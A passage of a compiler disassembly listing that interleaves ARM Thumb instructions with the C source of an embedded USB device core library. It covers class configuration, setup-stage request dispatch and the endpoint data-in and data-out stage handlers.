 800af18:	460b      	mov	r3, r1
 800af1a:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800af1c:	2300      	movs	r3, #0
 800af1e:	73fb      	strb	r3, [r7, #15]
        }
      }
    }
  }
#else
  if (pdev->pClass[0] != NULL)
 800af20:	687b      	ldr	r3, [r7, #4]
 800af22:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800af26:	2b00      	cmp	r3, #0
 800af28:	d009      	beq.n	800af3e <USBD_SetClassConfig+0x2e>
  {
    /* Set configuration and Start the Class */
    ret = (USBD_StatusTypeDef)pdev->pClass[0]->Init(pdev, cfgidx);
 800af2a:	687b      	ldr	r3, [r7, #4]
 800af2c:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800af30:	681b      	ldr	r3, [r3, #0]
 800af32:	78fa      	ldrb	r2, [r7, #3]
 800af34:	4611      	mov	r1, r2
 800af36:	6878      	ldr	r0, [r7, #4]
 800af38:	4798      	blx	r3
 800af3a:	4603      	mov	r3, r0
 800af3c:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800af3e:	7bfb      	ldrb	r3, [r7, #15]
}
 800af40:	4618      	mov	r0, r3
 800af42:	3710      	adds	r7, #16
 800af44:	46bd      	mov	sp, r7
 800af46:	bd80      	pop	{r7, pc}

0800af48 <USBD_ClrClassConfig>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status: USBD_StatusTypeDef
  */
USBD_StatusTypeDef USBD_ClrClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800af48:	b580      	push	{r7, lr}
 800af4a:	b084      	sub	sp, #16
 800af4c:	af00      	add	r7, sp, #0
 800af4e:	6078      	str	r0, [r7, #4]
 800af50:	460b      	mov	r3, r1
 800af52:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800af54:	2300      	movs	r3, #0
 800af56:	73fb      	strb	r3, [r7, #15]
      }
    }
  }
#else
  /* Clear configuration  and De-initialize the Class process */
  if (pdev->pClass[0]->DeInit(pdev, cfgidx) != 0U)
 800af58:	687b      	ldr	r3, [r7, #4]
 800af5a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800af5e:	685b      	ldr	r3, [r3, #4]
 800af60:	78fa      	ldrb	r2, [r7, #3]
 800af62:	4611      	mov	r1, r2
 800af64:	6878      	ldr	r0, [r7, #4]
 800af66:	4798      	blx	r3
 800af68:	4603      	mov	r3, r0
 800af6a:	2b00      	cmp	r3, #0
 800af6c:	d001      	beq.n	800af72 <USBD_ClrClassConfig+0x2a>
  {
    ret = USBD_FAIL;
 800af6e:	2303      	movs	r3, #3
 800af70:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800af72:	7bfb      	ldrb	r3, [r7, #15]
}
 800af74:	4618      	mov	r0, r3
 800af76:	3710      	adds	r7, #16
 800af78:	46bd      	mov	sp, r7
 800af7a:	bd80      	pop	{r7, pc}

0800af7c <USBD_LL_SetupStage>:
  *         Handle the setup stage
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetupStage(USBD_HandleTypeDef *pdev, uint8_t *psetup)
{
 800af7c:	b580      	push	{r7, lr}
 800af7e:	b084      	sub	sp, #16
 800af80:	af00      	add	r7, sp, #0
 800af82:	6078      	str	r0, [r7, #4]
 800af84:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret;

  USBD_ParseSetupRequest(&pdev->request, psetup);
 800af86:	687b      	ldr	r3, [r7, #4]
 800af88:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800af8c:	6839      	ldr	r1, [r7, #0]
 800af8e:	4618      	mov	r0, r3
 800af90:	f001 f8a7 	bl	800c0e2 <USBD_ParseSetupRequest>

  pdev->ep0_state = USBD_EP0_SETUP;
 800af94:	687b      	ldr	r3, [r7, #4]
 800af96:	2201      	movs	r2, #1
 800af98:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  pdev->ep0_data_len = pdev->request.wLength;
 800af9c:	687b      	ldr	r3, [r7, #4]
 800af9e:	f8b3 32b0 	ldrh.w	r3, [r3, #688]	; 0x2b0
 800afa2:	461a      	mov	r2, r3
 800afa4:	687b      	ldr	r3, [r7, #4]
 800afa6:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

  switch (pdev->request.bmRequest & 0x1FU)
 800afaa:	687b      	ldr	r3, [r7, #4]
 800afac:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800afb0:	f003 031f 	and.w	r3, r3, #31
 800afb4:	2b02      	cmp	r3, #2
 800afb6:	d01a      	beq.n	800afee <USBD_LL_SetupStage+0x72>
 800afb8:	2b02      	cmp	r3, #2
 800afba:	d822      	bhi.n	800b002 <USBD_LL_SetupStage+0x86>
 800afbc:	2b00      	cmp	r3, #0
 800afbe:	d002      	beq.n	800afc6 <USBD_LL_SetupStage+0x4a>
 800afc0:	2b01      	cmp	r3, #1
 800afc2:	d00a      	beq.n	800afda <USBD_LL_SetupStage+0x5e>
 800afc4:	e01d      	b.n	800b002 <USBD_LL_SetupStage+0x86>
  {
    case USB_REQ_RECIPIENT_DEVICE:
      ret = USBD_StdDevReq(pdev, &pdev->request);
 800afc6:	687b      	ldr	r3, [r7, #4]
 800afc8:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800afcc:	4619      	mov	r1, r3
 800afce:	6878      	ldr	r0, [r7, #4]
 800afd0:	f000 fad4 	bl	800b57c <USBD_StdDevReq>
 800afd4:	4603      	mov	r3, r0
 800afd6:	73fb      	strb	r3, [r7, #15]
      break;
 800afd8:	e020      	b.n	800b01c <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_INTERFACE:
      ret = USBD_StdItfReq(pdev, &pdev->request);
 800afda:	687b      	ldr	r3, [r7, #4]
 800afdc:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800afe0:	4619      	mov	r1, r3
 800afe2:	6878      	ldr	r0, [r7, #4]
 800afe4:	f000 fb3c 	bl	800b660 <USBD_StdItfReq>
 800afe8:	4603      	mov	r3, r0
 800afea:	73fb      	strb	r3, [r7, #15]
      break;
 800afec:	e016      	b.n	800b01c <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_ENDPOINT:
      ret = USBD_StdEPReq(pdev, &pdev->request);
 800afee:	687b      	ldr	r3, [r7, #4]
 800aff0:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800aff4:	4619      	mov	r1, r3
 800aff6:	6878      	ldr	r0, [r7, #4]
 800aff8:	f000 fb9e 	bl	800b738 <USBD_StdEPReq>
 800affc:	4603      	mov	r3, r0
 800affe:	73fb      	strb	r3, [r7, #15]
      break;
 800b000:	e00c      	b.n	800b01c <USBD_LL_SetupStage+0xa0>

    default:
      ret = USBD_LL_StallEP(pdev, (pdev->request.bmRequest & 0x80U));
 800b002:	687b      	ldr	r3, [r7, #4]
 800b004:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b008:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 800b00c:	b2db      	uxtb	r3, r3
 800b00e:	4619      	mov	r1, r3
 800b010:	6878      	ldr	r0, [r7, #4]
 800b012:	f001 fe13 	bl	800cc3c <USBD_LL_StallEP>
 800b016:	4603      	mov	r3, r0
 800b018:	73fb      	strb	r3, [r7, #15]
      break;
 800b01a:	bf00      	nop
  }

  return ret;
 800b01c:	7bfb      	ldrb	r3, [r7, #15]
}
 800b01e:	4618      	mov	r0, r3
 800b020:	3710      	adds	r7, #16
 800b022:	46bd      	mov	sp, r7
 800b024:	bd80      	pop	{r7, pc}

0800b026 <USBD_LL_DataOutStage>:
  * @param  pdata: data pointer
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataOutStage(USBD_HandleTypeDef *pdev,
                                        uint8_t epnum, uint8_t *pdata)
{
 800b026:	b580      	push	{r7, lr}
 800b028:	b086      	sub	sp, #24
 800b02a:	af00      	add	r7, sp, #0
 800b02c:	60f8      	str	r0, [r7, #12]
 800b02e:	460b      	mov	r3, r1
 800b030:	607a      	str	r2, [r7, #4]
 800b032:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret = USBD_OK;
 800b034:	2300      	movs	r3, #0
 800b036:	75fb      	strb	r3, [r7, #23]
  uint8_t idx;

  if (epnum == 0U)
 800b038:	7afb      	ldrb	r3, [r7, #11]
 800b03a:	2b00      	cmp	r3, #0
 800b03c:	d16e      	bne.n	800b11c <USBD_LL_DataOutStage+0xf6>
  {
    pep = &pdev->ep_out[0];
 800b03e:	68fb      	ldr	r3, [r7, #12]
 800b040:	f503 73aa 	add.w	r3, r3, #340	; 0x154
 800b044:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_OUT)
 800b046:	68fb      	ldr	r3, [r7, #12]
 800b048:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b04c:	2b03      	cmp	r3, #3
 800b04e:	f040 8098 	bne.w	800b182 <USBD_LL_DataOutStage+0x15c>
    {
      if (pep->rem_length > pep->maxpacket)
 800b052:	693b      	ldr	r3, [r7, #16]
 800b054:	689a      	ldr	r2, [r3, #8]
 800b056:	693b      	ldr	r3, [r7, #16]
 800b058:	68db      	ldr	r3, [r3, #12]
 800b05a:	429a      	cmp	r2, r3
 800b05c:	d913      	bls.n	800b086 <USBD_LL_DataOutStage+0x60>
      {
        pep->rem_length -= pep->maxpacket;
 800b05e:	693b      	ldr	r3, [r7, #16]
 800b060:	689a      	ldr	r2, [r3, #8]
 800b062:	693b      	ldr	r3, [r7, #16]
 800b064:	68db      	ldr	r3, [r3, #12]
 800b066:	1ad2      	subs	r2, r2, r3
 800b068:	693b      	ldr	r3, [r7, #16]
 800b06a:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueRx(pdev, pdata, MIN(pep->rem_length, pep->maxpacket));
 800b06c:	693b      	ldr	r3, [r7, #16]
 800b06e:	68da      	ldr	r2, [r3, #12]
 800b070:	693b      	ldr	r3, [r7, #16]
 800b072:	689b      	ldr	r3, [r3, #8]
 800b074:	4293      	cmp	r3, r2
 800b076:	bf28      	it	cs
 800b078:	4613      	movcs	r3, r2
 800b07a:	461a      	mov	r2, r3
 800b07c:	6879      	ldr	r1, [r7, #4]
 800b07e:	68f8      	ldr	r0, [r7, #12]
 800b080:	f001 f923 	bl	800c2ca <USBD_CtlContinueRx>
 800b084:	e07d      	b.n	800b182 <USBD_LL_DataOutStage+0x15c>
      }
      else
      {
        /* Find the class ID relative to the current request */
        switch (pdev->request.bmRequest & 0x1FU)
 800b086:	68fb      	ldr	r3, [r7, #12]
 800b088:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b08c:	f003 031f 	and.w	r3, r3, #31
 800b090:	2b02      	cmp	r3, #2
 800b092:	d014      	beq.n	800b0be <USBD_LL_DataOutStage+0x98>
 800b094:	2b02      	cmp	r3, #2
 800b096:	d81d      	bhi.n	800b0d4 <USBD_LL_DataOutStage+0xae>
 800b098:	2b00      	cmp	r3, #0
 800b09a:	d002      	beq.n	800b0a2 <USBD_LL_DataOutStage+0x7c>
 800b09c:	2b01      	cmp	r3, #1
 800b09e:	d003      	beq.n	800b0a8 <USBD_LL_DataOutStage+0x82>
 800b0a0:	e018      	b.n	800b0d4 <USBD_LL_DataOutStage+0xae>
        {
          case USB_REQ_RECIPIENT_DEVICE:
            /* Device requests must be managed by the first instantiated class
               (or duplicated by all classes for simplicity) */
            idx = 0U;
 800b0a2:	2300      	movs	r3, #0
 800b0a4:	75bb      	strb	r3, [r7, #22]
            break;
 800b0a6:	e018      	b.n	800b0da <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_INTERFACE:
            idx = USBD_CoreFindIF(pdev, LOBYTE(pdev->request.wIndex));
 800b0a8:	68fb      	ldr	r3, [r7, #12]
 800b0aa:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b0ae:	b2db      	uxtb	r3, r3
 800b0b0:	4619      	mov	r1, r3
 800b0b2:	68f8      	ldr	r0, [r7, #12]
 800b0b4:	f000 f9d2 	bl	800b45c <USBD_CoreFindIF>
 800b0b8:	4603      	mov	r3, r0
 800b0ba:	75bb      	strb	r3, [r7, #22]
            break;
 800b0bc:	e00d      	b.n	800b0da <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_ENDPOINT:
            idx = USBD_CoreFindEP(pdev, LOBYTE(pdev->request.wIndex));
 800b0be:	68fb      	ldr	r3, [r7, #12]
 800b0c0:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b0c4:	b2db      	uxtb	r3, r3
 800b0c6:	4619      	mov	r1, r3
 800b0c8:	68f8      	ldr	r0, [r7, #12]
 800b0ca:	f000 f9d4 	bl	800b476 <USBD_CoreFindEP>
 800b0ce:	4603      	mov	r3, r0
 800b0d0:	75bb      	strb	r3, [r7, #22]
            break;
 800b0d2:	e002      	b.n	800b0da <USBD_LL_DataOutStage+0xb4>

          default:
            /* Back to the first class in case of doubt */
            idx = 0U;
 800b0d4:	2300      	movs	r3, #0
 800b0d6:	75bb      	strb	r3, [r7, #22]
            break;
 800b0d8:	bf00      	nop
        }

        if (idx < USBD_MAX_SUPPORTED_CLASS)
 800b0da:	7dbb      	ldrb	r3, [r7, #22]
 800b0dc:	2b00      	cmp	r3, #0
 800b0de:	d119      	bne.n	800b114 <USBD_LL_DataOutStage+0xee>
        {
          /* Setup the class ID and route the request to the relative class function */
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b0e0:	68fb      	ldr	r3, [r7, #12]
 800b0e2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b0e6:	b2db      	uxtb	r3, r3
 800b0e8:	2b03      	cmp	r3, #3
 800b0ea:	d113      	bne.n	800b114 <USBD_LL_DataOutStage+0xee>
          {
            if (pdev->pClass[idx]->EP0_RxReady != NULL)
 800b0ec:	7dba      	ldrb	r2, [r7, #22]
 800b0ee:	68fb      	ldr	r3, [r7, #12]
 800b0f0:	32ae      	adds	r2, #174	; 0xae
 800b0f2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b0f6:	691b      	ldr	r3, [r3, #16]
 800b0f8:	2b00      	cmp	r3, #0
 800b0fa:	d00b      	beq.n	800b114 <USBD_LL_DataOutStage+0xee>
            {
              pdev->classId = idx;
 800b0fc:	7dba      	ldrb	r2, [r7, #22]
 800b0fe:	68fb      	ldr	r3, [r7, #12]
 800b100:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[idx]->EP0_RxReady(pdev);
 800b104:	7dba      	ldrb	r2, [r7, #22]
 800b106:	68fb      	ldr	r3, [r7, #12]
 800b108:	32ae      	adds	r2, #174	; 0xae
 800b10a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b10e:	691b      	ldr	r3, [r3, #16]
 800b110:	68f8      	ldr	r0, [r7, #12]
 800b112:	4798      	blx	r3
            }
          }
        }

        (void)USBD_CtlSendStatus(pdev);
 800b114:	68f8      	ldr	r0, [r7, #12]
 800b116:	f001 f8e9 	bl	800c2ec <USBD_CtlSendStatus>
 800b11a:	e032      	b.n	800b182 <USBD_LL_DataOutStage+0x15c>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, (epnum & 0x7FU));
 800b11c:	7afb      	ldrb	r3, [r7, #11]
 800b11e:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b122:	b2db      	uxtb	r3, r3
 800b124:	4619      	mov	r1, r3
 800b126:	68f8      	ldr	r0, [r7, #12]
 800b128:	f000 f9a5 	bl	800b476 <USBD_CoreFindEP>
 800b12c:	4603      	mov	r3, r0
 800b12e:	75bb      	strb	r3, [r7, #22]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b130:	7dbb      	ldrb	r3, [r7, #22]
 800b132:	2bff      	cmp	r3, #255	; 0xff
 800b134:	d025      	beq.n	800b182 <USBD_LL_DataOutStage+0x15c>
 800b136:	7dbb      	ldrb	r3, [r7, #22]
 800b138:	2b00      	cmp	r3, #0
 800b13a:	d122      	bne.n	800b182 <USBD_LL_DataOutStage+0x15c>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b13c:	68fb      	ldr	r3, [r7, #12]
 800b13e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b142:	b2db      	uxtb	r3, r3
 800b144:	2b03      	cmp	r3, #3
 800b146:	d117      	bne.n	800b178 <USBD_LL_DataOutStage+0x152>
      {
        if (pdev->pClass[idx]->DataOut != NULL)
 800b148:	7dba      	ldrb	r2, [r7, #22]
 800b14a:	68fb      	ldr	r3, [r7, #12]
 800b14c:	32ae      	adds	r2, #174	; 0xae
 800b14e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b152:	699b      	ldr	r3, [r3, #24]
 800b154:	2b00      	cmp	r3, #0
 800b156:	d00f      	beq.n	800b178 <USBD_LL_DataOutStage+0x152>
        {
          pdev->classId = idx;
 800b158:	7dba      	ldrb	r2, [r7, #22]
 800b15a:	68fb      	ldr	r3, [r7, #12]
 800b15c:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataOut(pdev, epnum);
 800b160:	7dba      	ldrb	r2, [r7, #22]
 800b162:	68fb      	ldr	r3, [r7, #12]
 800b164:	32ae      	adds	r2, #174	; 0xae
 800b166:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b16a:	699b      	ldr	r3, [r3, #24]
 800b16c:	7afa      	ldrb	r2, [r7, #11]
 800b16e:	4611      	mov	r1, r2
 800b170:	68f8      	ldr	r0, [r7, #12]
 800b172:	4798      	blx	r3
 800b174:	4603      	mov	r3, r0
 800b176:	75fb      	strb	r3, [r7, #23]
        }
      }
      if (ret != USBD_OK)
 800b178:	7dfb      	ldrb	r3, [r7, #23]
 800b17a:	2b00      	cmp	r3, #0
 800b17c:	d001      	beq.n	800b182 <USBD_LL_DataOutStage+0x15c>
      {
        return ret;
 800b17e:	7dfb      	ldrb	r3, [r7, #23]
 800b180:	e000      	b.n	800b184 <USBD_LL_DataOutStage+0x15e>
      }
    }
  }

  return USBD_OK;
 800b182:	2300      	movs	r3, #0
}
 800b184:	4618      	mov	r0, r3
 800b186:	3718      	adds	r7, #24
 800b188:	46bd      	mov	sp, r7
 800b18a:	bd80      	pop	{r7, pc}

0800b18c <USBD_LL_DataInStage>:
  * @param  epnum: endpoint index
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataInStage(USBD_HandleTypeDef *pdev,
                                       uint8_t epnum, uint8_t *pdata)
{
 800b18c:	b580      	push	{r7, lr}
 800b18e:	b086      	sub	sp, #24
 800b190:	af00      	add	r7, sp, #0
 800b192:	60f8      	str	r0, [r7, #12]
 800b194:	460b      	mov	r3, r1
 800b196:	607a      	str	r2, [r7, #4]
 800b198:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret;
  uint8_t idx;

  if (epnum == 0U)
 800b19a:	7afb      	ldrb	r3, [r7, #11]
 800b19c:	2b00      	cmp	r3, #0
 800b19e:	d16f      	bne.n	800b280 <USBD_LL_DataInStage+0xf4>
  {
    pep = &pdev->ep_in[0];
 800b1a0:	68fb      	ldr	r3, [r7, #12]
 800b1a2:	3314      	adds	r3, #20
 800b1a4:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_IN)
 800b1a6:	68fb      	ldr	r3, [r7, #12]
 800b1a8:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b1ac:	2b02      	cmp	r3, #2
 800b1ae:	d15a      	bne.n	800b266 <USBD_LL_DataInStage+0xda>
    {
      if (pep->rem_length > pep->maxpacket)
 800b1b0:	693b      	ldr	r3, [r7, #16]
 800b1b2:	689a      	ldr	r2, [r3, #8]
 800b1b4:	693b      	ldr	r3, [r7, #16]
 800b1b6:	68db      	ldr	r3, [r3, #12]
 800b1b8:	429a      	cmp	r2, r3
 800b1ba:	d914      	bls.n	800b1e6 <USBD_LL_DataInStage+0x5a>
      {
        pep->rem_length -= pep->maxpacket;
 800b1bc:	693b      	ldr	r3, [r7, #16]
 800b1be:	689a      	ldr	r2, [r3, #8]
 800b1c0:	693b      	ldr	r3, [r7, #16]
 800b1c2:	68db      	ldr	r3, [r3, #12]
 800b1c4:	1ad2      	subs	r2, r2, r3
 800b1c6:	693b      	ldr	r3, [r7, #16]
 800b1c8:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueSendData(pdev, pdata, pep->rem_length);
 800b1ca:	693b      	ldr	r3, [r7, #16]
 800b1cc:	689b      	ldr	r3, [r3, #8]
 800b1ce:	461a      	mov	r2, r3
 800b1d0:	6879      	ldr	r1, [r7, #4]
 800b1d2:	68f8      	ldr	r0, [r7, #12]
 800b1d4:	f001 f84b 	bl	800c26e <USBD_CtlContinueSendData>

        /* Prepare endpoint for premature end of transfer */
        (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b1d8:	2300      	movs	r3, #0
 800b1da:	2200      	movs	r2, #0
 800b1dc:	2100      	movs	r1, #0
 800b1de:	68f8      	ldr	r0, [r7, #12]
 800b1e0:	f001 fe34 	bl	800ce4c <USBD_LL_PrepareReceive>
 800b1e4:	e03f      	b.n	800b266 <USBD_LL_DataInStage+0xda>
      }
      else
      {
        /* last packet is MPS multiple, so send ZLP packet */
        if ((pep->maxpacket == pep->rem_length) &&
 800b1e6:	693b      	ldr	r3, [r7, #16]
 800b1e8:	68da      	ldr	r2, [r3, #12]
 800b1ea:	693b      	ldr	r3, [r7, #16]
 800b1ec:	689b      	ldr	r3, [r3, #8]
 800b1ee:	429a      	cmp	r2, r3
 800b1f0:	d11c      	bne.n	800b22c <USBD_LL_DataInStage+0xa0>
            (pep->total_length >= pep->maxpacket) &&
 800b1f2:	693b      	ldr	r3, [r7, #16]
 800b1f4:	685a      	ldr	r2, [r3, #4]
 800b1f6:	693b      	ldr	r3, [r7, #16]
 800b1f8:	68db      	ldr	r3, [r3, #12]
        if ((pep->maxpacket == pep->rem_length) &&
 800b1fa:	429a      	cmp	r2, r3
 800b1fc:	d316      	bcc.n	800b22c <USBD_LL_DataInStage+0xa0>
            (pep->total_length < pdev->ep0_data_len))
 800b1fe:	693b      	ldr	r3, [r7, #16]
 800b200:	685a      	ldr	r2, [r3, #4]
 800b202:	68fb      	ldr	r3, [r7, #12]
 800b204:	f8d3 3298 	ldr.w	r3, [r3, #664]	; 0x298
            (pep->total_length >= pep->maxpacket) &&
 800b208:	429a      	cmp	r2, r3
 800b20a:	d20f      	bcs.n	800b22c <USBD_LL_DataInStage+0xa0>
        {
          (void)USBD_CtlContinueSendData(pdev, NULL, 0U);
 800b20c:	2200      	movs	r2, #0
 800b20e:	2100      	movs	r1, #0
 800b210:	68f8      	ldr	r0, [r7, #12]
 800b212:	f001 f82c 	bl	800c26e <USBD_CtlContinueSendData>
          pdev->ep0_data_len = 0U;
 800b216:	68fb      	ldr	r3, [r7, #12]
 800b218:	2200      	movs	r2, #0
 800b21a:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

          /* Prepare endpoint for premature end of transfer */
          (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b21e:	2300      	movs	r3, #0
 800b220:	2200      	movs	r2, #0
 800b222:	2100      	movs	r1, #0
 800b224:	68f8      	ldr	r0, [r7, #12]
 800b226:	f001 fe11 	bl	800ce4c <USBD_LL_PrepareReceive>
 800b22a:	e01c      	b.n	800b266 <USBD_LL_DataInStage+0xda>
        }
        else
        {
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b22c:	68fb      	ldr	r3, [r7, #12]
 800b22e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b232:	b2db      	uxtb	r3, r3
 800b234:	2b03      	cmp	r3, #3
 800b236:	d10f      	bne.n	800b258 <USBD_LL_DataInStage+0xcc>
          {
            if (pdev->pClass[0]->EP0_TxSent != NULL)
 800b238:	68fb      	ldr	r3, [r7, #12]
 800b23a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b23e:	68db      	ldr	r3, [r3, #12]
 800b240:	2b00      	cmp	r3, #0
 800b242:	d009      	beq.n	800b258 <USBD_LL_DataInStage+0xcc>
            {
              pdev->classId = 0U;
 800b244:	68fb      	ldr	r3, [r7, #12]
 800b246:	2200      	movs	r2, #0
 800b248:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[0]->EP0_TxSent(pdev);
 800b24c:	68fb      	ldr	r3, [r7, #12]
 800b24e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b252:	68db      	ldr	r3, [r3, #12]
 800b254:	68f8      	ldr	r0, [r7, #12]
 800b256:	4798      	blx	r3
            }
          }
          (void)USBD_LL_StallEP(pdev, 0x80U);
 800b258:	2180      	movs	r1, #128	; 0x80
 800b25a:	68f8      	ldr	r0, [r7, #12]
 800b25c:	f001 fcee 	bl	800cc3c <USBD_LL_StallEP>
          (void)USBD_CtlReceiveStatus(pdev);
 800b260:	68f8      	ldr	r0, [r7, #12]
 800b262:	f001 f856 	bl	800c312 <USBD_CtlReceiveStatus>
        }
      }
    }

    if (pdev->dev_test_mode != 0U)
 800b266:	68fb      	ldr	r3, [r7, #12]
 800b268:	f893 32a0 	ldrb.w	r3, [r3, #672]	; 0x2a0
 800b26c:	2b00      	cmp	r3, #0
 800b26e:	d03a      	beq.n	800b2e6 <USBD_LL_DataInStage+0x15a>
    {
      (void)USBD_RunTestMode(pdev);
 800b270:	68f8      	ldr	r0, [r7, #12]
 800b272:	f7ff fe42 	bl	800aefa <USBD_RunTestMode>
      pdev->dev_test_mode = 0U;
 800b276:	68fb      	ldr	r3, [r7, #12]
 800b278:	2200      	movs	r2, #0
 800b27a:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
 800b27e:	e032      	b.n	800b2e6 <USBD_LL_DataInStage+0x15a>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, ((uint8_t)epnum | 0x80U));
 800b280:	7afb      	ldrb	r3, [r7, #11]
 800b282:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800b286:	b2db      	uxtb	r3, r3
 800b288:	4619      	mov	r1, r3
 800b28a:	68f8      	ldr	r0, [r7, #12]
 800b28c:	f000 f8f3 	bl	800b476 <USBD_CoreFindEP>
 800b290:	4603      	mov	r3, r0
 800b292:	75fb      	strb	r3, [r7, #23]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b294:	7dfb      	ldrb	r3, [r7, #23]
 800b296:	2bff      	cmp	r3, #255	; 0xff
 800b298:	d025      	beq.n	800b2e6 <USBD_LL_DataInStage+0x15a>
 800b29a:	7dfb      	ldrb	r3, [r7, #23]
 800b29c:	2b00      	cmp	r3, #0
 800b29e:	d122      	bne.n	800b2e6 <USBD_LL_DataInStage+0x15a>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b2a0:	68fb      	ldr	r3, [r7, #12]
 800b2a2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b2a6:	b2db      	uxtb	r3, r3
 800b2a8:	2b03      	cmp	r3, #3
 800b2aa:	d11c      	bne.n	800b2e6 <USBD_LL_DataInStage+0x15a>
      {
        if (pdev->pClass[idx]->DataIn != NULL)
 800b2ac:	7dfa      	ldrb	r2, [r7, #23]
 800b2ae:	68fb      	ldr	r3, [r7, #12]
 800b2b0:	32ae      	adds	r2, #174	; 0xae
 800b2b2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b2b6:	695b      	ldr	r3, [r3, #20]
 800b2b8:	2b00      	cmp	r3, #0
 800b2ba:	d014      	beq.n	800b2e6 <USBD_LL_DataInStage+0x15a>
        {
          pdev->classId = idx;
 800b2bc:	7dfa      	ldrb	r2, [r7, #23]
 800b2be:	68fb      	ldr	r3, [r7, #12]
 800b2c0:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataIn(pdev, epnum);
 800b2c4:	7dfa      	ldrb	r2, [r7, #23]
 800b2c6:	68fb      	ldr	r3, [r7, #12]
 800b2c8:	32ae      	adds	r2, #174	; 0xae
 800b2ca:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b2ce:	695b      	ldr	r3, [r3, #20]
 800b2d0:	7afa      	ldrb	r2, [r7, #11]
 800b2d2:	4611      	mov	r1, r2
 800b2d4:	68f8      	ldr	r0, [r7, #12]
 800b2d6:	4798      	blx	r3
 800b2d8:	4603      	mov	r3, r0
 800b2da:	75bb      	strb	r3, [r7, #22]

          if (ret != USBD_OK)
 800b2dc:	7dbb      	ldrb	r3, [r7, #22]
 800b2de:	2b00      	cmp	r3, #0
 800b2e0:	d001      	beq.n	800b2e6 <USBD_LL_DataInStage+0x15a>
          {
            return ret;
 800b2e2:	7dbb      	ldrb	r3, [r7, #22]
 800b2e4:	e000      	b.n	800b2e8 <USBD_LL_DataInStage+0x15c>
        }
      }
    }
  }

  return USBD_OK;
